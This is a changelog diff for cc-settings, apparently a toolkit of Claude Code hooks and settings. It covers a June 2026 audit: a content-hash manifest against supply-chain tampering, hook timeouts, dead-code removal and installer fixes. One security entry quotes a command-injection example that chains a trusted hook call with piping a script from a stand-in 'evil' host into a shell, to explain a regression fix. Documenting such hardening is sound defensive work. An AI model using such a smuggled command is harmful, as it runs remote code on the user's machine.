@@ -6,6 +6,45 @@ All notable changes to cc-settings are documented here.
 
 ## [Unreleased]
 
+Whole-codebase `/nuclear-review` audit pass (June 2026): ~1,100 lines of dead or duplicated code removed, installer bash-era ceremony deleted, zod v4 idioms adopted. Behavior-preserving except where noted.
+
+### Security
+
+- **Supply-chain defense is now content-based, not path-based.** The auditor previously trusted any `bun "$HOME/.claude/src/.../*.ts"` command by path shape alone — malware could drop a new file under `~/.claude/src/` (classified *trusted*, downgrading the fingerprint alarm) or append a payload to an already-registered shipped script (no alarm at all, since the fingerprint covers only `settings.hooks`). The installer now writes a SHA256 manifest of every installed `src/**/*.ts` (`~/.claude/.cc-settings-src-manifest`); `verify-hooks` re-checks it at SessionStart and `audit:hooks` only classifies a shipped-path command *trusted* when its content hash matches the manifest (no manifest → *unknown*; mismatch or unmanifested file → *suspicious*). Like the fingerprint, the manifest is refreshed only by `setup.sh` — never by the auditor — so malware can't whitelist itself. SECURITY.md documents the new layer and the remaining non-goals (bun binary, node_modules, coordinated sentinel tampering). Upgrading users will see *trusted* drop to *unknown* until they re-run `setup.sh`.
+- **Blocking PreToolUse hooks now carry `timeout: 5`** (safety-net, pre-edit-validate, freeze-guard) — a wedged Bun startup previously stalled every Bash/Edit for the 60s platform default.
+- **Auditor hardened against command-string concatenation** (re-audit finding on the manifest fix itself): `TRUSTED_BUN_CC` previously allowed arbitrary trailing text, so `bun ".../safety-net.ts" ; curl evil | sh` matched as one trusted command and the malware-signature check was skipped on the trusted path. The trailing-arg group now accepts only simple word tokens (shell metacharacters reject the match), and malware signatures are checked first, unconditionally — a hit always classifies *suspicious*, even for a manifest-verified command. Regression tests cover the `;`/`&&`/pipe/`$(...)`/backtick vectors with a verified manifest present.
+
+### Removed
+
+- **Dead code surfaced by the audit** — the barrel files `src/index.ts`/`src/lib/index.ts`/`src/schemas/index.ts` (zero importers; consumers import concrete files), `src/lib/stack.ts` + `tests/stack.test.ts` (no production consumers — the skills its header named were retired or never wired; stale claims fixed in MANUAL.md and the May consolidation audit), `bench/prototype/` (its compile-to-binary question was settled — hooks ship as `bun` source invocations), and `contexts/` (thin pointers to `profiles/` documenting a `/context` ecosystem switcher that never existed; the installer prunes the legacy installed dir on upgrade).
+- `src/lib/version-drift.ts` — folded into `version-delta.ts`; the near-synonym module names were a trap.
+- `src/schemas/hooks-config.ts` + `schemas/hooks-config.schema.json` — the legacy `hooks-config.json` file tier in `src/lib/hook-config.ts` (kept alive solely to back-fill three `claude_md_monitor` env defaults, for files the installer deletes on every run) is gone; `getClaudeMdMonitor` is now env vars + defaults, and the schema lost its last consumer.
+
+### Changed (hooks hot path)
+
+- **`parallelmax-nudge.ts` + `review-queue-nudge.ts` → one `tool-cadence.ts`.** Both ran unmatched on every PostToolUse (two Bun spawns per tool call) and already shared state through the filesystem. One spawn now runs both branches verbatim; nudge texts, state files, and debounce are unchanged.
+- **One block protocol.** New `blockDecision()` / `readToolInputEnv()` in `hook-runtime.ts`; safety-net, freeze-guard, and pre-edit-validate all block with the documented `{"decision":"block"}` JSON (pre-edit-validate previously emitted plain text). pre-edit-validate also gained a top-level catch (fail-open on unexpected throw). safety-net's AI-attribution check collapsed to one regex/one branch — the old commit/PR regex pair matched identical strings.
+- **statusline hardening + spawn diet** — the whole render is wrapped (any error prints a degraded line and exits 0 instead of blanking; `Bun.spawn` throws synchronously when git is absent); the redundant `rev-parse` probe is gone and ahead/behind is one `rev-list --left-right --count`, with independent lookups under `Promise.all`.
+- **Fail-open is now behaviorally tested** — `tests/hook-fail-open.test.ts` spawns every wired hook (plus the statusline command from `10-core.json`, which the old grep-based check never saw) with garbage stdin/env and asserts exit 0, instead of grepping sources for `try {`.
+
+### Changed
+
+- **Installer (`src/setup.ts` + libs) de-bashed.** The staged-file dance is gone: `mergeSettingsWithMcpPreservation` and `installMcpToClaudeJson` now take the in-memory composed settings instead of re-reading `.team-settings.staged.json` from disk (three disk round-trips and a duplicate MCP validation deleted). New `src/lib/merge-keyed.ts` (`unionByKey`/`subtractByKey`) replaces four hand-rolled JSON-keyed set-arithmetic loops; `removeManagedMcpServers` moved to `src/lib/mcp.ts` where the MCP domain logic lives. `PROFILE_MANIFEST` in `light-profile.ts` is now the single source of truth for the per-profile file footprint — install, light-cleanup, dry-run, and summary all derive from it instead of four hand-maintained lists. One `fingerprintSettingsHooks` helper replaces the copy-pasted light/full fingerprint blocks (the light copy had drifted to swallowing schema issues silently).
+- **zod v4 idioms** — all 16 deprecated `.passthrough()` sites became `z.looseObject()`, the one `.strict()` became `z.strictObject()`; emitted JSON Schemas are byte-identical. Stale strictness-policy comments in `claude-json.ts`/`skill.ts` rewritten (the real typo guard is the key-name test, not strictness). The permission-mode enum now has one home (`permissions.ts`; `agent.ts` re-exports).
+- **Scripts cluster** — new `src/lib/artifact-store.ts` (timestamp IDs, `latest` symlink dance, list/resolve) shared by `checkpoint` and `handoff`, which had reimplemented it twice (on-disk formats and CLI surfaces unchanged); new `src/lib/tsc.ts` `runTsc()` shared by `post-edit-tsc`/`pre-commit-tsc`; `frontmatter-validate.ts`'s three identical walkers became one generic walker + spec table; `claude-audit` got a real entry point (`bun run claude-audit`) after its `/audit` skill was retired; `new-note` uses the canonical `runGit`.
+- **Test files renamed for their subject, not the migration that created them** — `phase2-scripts.test.ts` → `scripts-smoke.test.ts`; `phase3-libs.test.ts` dissolved into `mcp.test.ts` (ending split MCP coverage) and `lib-helpers.test.ts`. `buildPermissionsBlock` moved from the `gen-permissions-doc` script into `src/lib/permissions-doc.ts` (the one script that moonlighted as a lib).
+- **Rules dedup** — `rules/react-perf.md` no longer repeats three blocks verbatim from `performance.md` (both load together on every React file); it now cross-links and keeps only additive content. `profiles/webgl.md`'s instancing example rewritten without `useMemo` per its own React Compiler guidance.
+
+### Fixed
+
+- **Backup failure now aborts the install** (was: `tar` exit code ignored, install proceeded into `cleanOldConfig`'s `rm -rf` with no restore point — the advertised `--rollback` safety net silently didn't exist on backup failure).
+- **A typo in `config/*.json` now fails the install loudly** — `composeSettings` schema-validates the composed fragments and throws; previously team-config validation was debug-log-only. User-settings forward-compat tolerance is unchanged.
+- `readJsonOrNull` no longer mislabels `EACCES`/`EISDIR` as "not valid JSON" — only real parse failures wrap as `JsonParseError`.
+- `src/lib/status.ts` parses `settings.json` once with the `Settings` schema instead of four bare casts; `checkpoint restore` validates the (user-editable) checkpoint file instead of crashing on malformed input.
+- `~/.claude/session-titles/` is now pruned by session-start (>30 days); it previously grew unboundedly.
+- `stop-summary` wording now says what it measures (working-tree modified files, not "session touched").
+- `MANUAL.md` no longer references the nonexistent `web-vitals` rule; `@inquirer/confirm` bumped 6.1.0 → 6.1.1.
+
 ## [11.23.0] — 2026-06-09
 
 Adopts **Claude Fable 5** (`claude-fable-5`) — Anthropic's new top tier above Opus, tuned for agentic/software-engineering work — as the cc-settings default model.
